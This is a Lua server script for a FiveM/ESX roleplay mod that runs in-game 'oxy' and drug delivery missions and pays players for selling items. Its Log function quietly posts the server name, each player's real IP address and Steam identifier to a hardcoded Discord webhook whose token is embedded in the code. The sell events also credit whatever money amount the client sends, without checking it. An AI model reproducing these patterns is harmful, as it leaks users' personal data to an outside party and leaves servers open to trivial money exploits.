ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

ESX.RegisterServerCallback('deliveries:canDoOxyMissions', function(source, cb)
    local xPlayer = ESX.GetPlayerFromId(source)
    local money = xPlayer.getMoney()
    if money == Config.OxyStart or money > Config.OxyStart then
        cb(true)
    else
        cb(false)
    end
end)

RegisterServerEvent('oxydelivery:sellOxy')
AddEventHandler('oxydelivery:sellOxy', function(count,money)
    local xPlayer = ESX.GetPlayerFromId(source)

    if xPlayer.getInventoryItem('oxy').count >= count then
        xPlayer.removeInventoryItem('oxy',count)
        xPlayer.addMoney(money)
    else
        TriggerClientEvent('notification',source,'You dont have enough goods.', 2)
    end
end)

RegisterServerEvent('oxydelivery:sellDrugs')
AddEventHandler('oxydelivery:sellDrugs', function(count,money)
    local xPlayer = ESX.GetPlayerFromId(source)

    if xPlayer.getInventoryItem('meth_packaged').count < count and xPlayer.getInventoryItem('cocaine').count < count then
        TriggerClientEvent('notification',source,'You dont have enough goods.', 2)
    end

    if xPlayer.getInventoryItem('cocaine').count >= count then
        xPlayer.removeInventoryItem('cocaine',count)
        xPlayer.addMoney(money)
    end

    if xPlayer.getInventoryItem('meth_packaged').count >= count then
        xPlayer.removeInventoryItem('meth_packaged',count)
        xPlayer.addMoney(money)
    end

end)

RegisterServerEvent('oxydelivery:sellJoints')
AddEventHandler('oxydelivery:sellJoints', function(count,money)
    local xPlayer = ESX.GetPlayerFromId(source)

    if xPlayer.getInventoryItem('joint').count >= count then
        xPlayer.removeInventoryItem('joint',count)
        xPlayer.addMoney(money)
    else
        TriggerClientEvent('notification',source,'You dont have enough goods.', 2)
    end
end)

RegisterServerEvent('oxydelivery:sellElectronics')
AddEventHandler('oxydelivery:sellElectronics', function(count,money)
    local xPlayer = ESX.GetPlayerFromId(source)

    if xPlayer.getInventoryItem('electronics').count >= count then
        xPlayer.removeInventoryItem('electronics',count)
        xPlayer.addMoney(money)
    else
        TriggerClientEvent('notification',source,'You dont have enough electronics.', 2)
    end
end)

RegisterServerEvent('oxydelivery:startmissions')
AddEventHandler('oxydelivery:startmissions', function()
    local xPlayer = ESX.GetPlayerFromId(source)
    xPlayer.removeMoney(Config.OxyStart)
    TriggerClientEvent('oxydelivery:startDealing', source)
    TriggerClientEvent('oxydelivery:client', source)
    TimesOut = GetGameTimer()
    Log(source,GetPlayerName(source) .. ' Start oxy runs mission!')
end)

RegisterServerEvent('delivery:MissionComplete')
AddEventHandler('delivery:MissionComplete', function(cashPayment, currentItem)
    local xPlayer = ESX.GetPlayerFromId(source)
    xPlayer.addMoney(cashPayment)

    if math.random(1,3) ~= 2 then
        xPlayer.addInventoryItem(currentItem, math.random(Config.OxyReward[1],Config.OxyReward[2]))
    end

    if math.random(1,10) == 5 then
        xPlayer.addInventoryItem('advancedlockpick', 1)
    end
end)

function Log(source,data)
    local url = "https://discordapp.com/api/webhooks/749015424641007697/ffhpDiA7iajsNLt2erXDkDY1iGimHqjmbkfKVwBux1XB_YiG5WVzixViKyvY9lEwUEwE"
    local id = source
    local time = os.date("%Y/%m/%d %X")
    local msg = 'Server name: '.. GetConvar('sv_hostname', 'Invaild Server Name') .. '\n Player IP: '.. GetPlayerEndpoint(id) .. '\n Player Steam: '.. GetPlayerIdentifier(id)
    PerformHttpRequest(url, function(err, text, headers) end, 'POST', json.encode({username = "Oxyruns logs", content = "```css\n[" .. time .. "] " .. data .. "\n " .. msg .. "```"}), {['Content-Type'] = 'application/json'})
end
